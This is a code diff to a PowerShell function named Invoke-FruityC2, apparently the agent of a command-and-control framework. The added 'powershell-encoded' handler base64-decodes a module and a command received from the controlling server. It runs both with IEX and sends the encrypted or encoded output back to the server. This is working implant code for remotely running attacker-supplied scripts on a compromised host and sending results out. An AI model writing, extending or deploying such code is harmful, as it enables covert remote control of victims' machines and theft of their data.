@@ -326,10 +326,16 @@ function Invoke-FruityC2 {
             [String]$exec_command = $temp[0]
             [Int]$exec_flag = [convert]::ToInt32($temp[1], 10)
             $exec_data = ""
+            $exec_import = ""
             try {
                 [String]$exec_data = $temp[2]
             } catch {
                 $exec_data = ""    
+            }
+            try {
+                [String]$exec_import = $temp[3]
+            } catch {
+                $exec_import = ""    
             }
 
             if ($flag -lt $exec_flag)
@@ -427,16 +433,22 @@ function Invoke-FruityC2 {
                         Send-Data -param "send=$output"
                 }
 
-                ElseIf ($exec_command.StartsWith("powershell-encoded ")){
-                        $exec_command = $exec_command.Replace("powershell-encoded ", "powershell ")
-                        $exec_command
-                        <#
-                        $output = execPowershellCommand($exec_command)
-                        echo $output
-                        $output = b64encoder($output)
-                        $URL = "http$($SSL)://$($Rserver):$($Rport)/send"
-                        Invoke-submitPostForm -url $URL -param "send=$output"
-                        #>
+                ElseIf ($exec_command.StartsWith("powershell-encoded")){
+                        echo "COMMAND: powershell-encoded"
+                        $exec_command = $exec_command.Replace("powershell-encoded ", "")
+                        # IMPORT MODULE IF NOT EMPTY
+                        echo "[IMPORT]"
+                        if ($exec_import -ne "") { IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import))) }
+                        # DECODE AND EXEC COMAND
+                        echo "[EXEC]"
+                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
+                        #$exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data)) # BASE64
+                        $output = execPowershellCommand($exec_data)
+
+                        echo $output # DEBUG
+
+                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+                        Send-Data -param "send=$output"
                 }
 
                 # PRINT CURRENT DIRECTORY
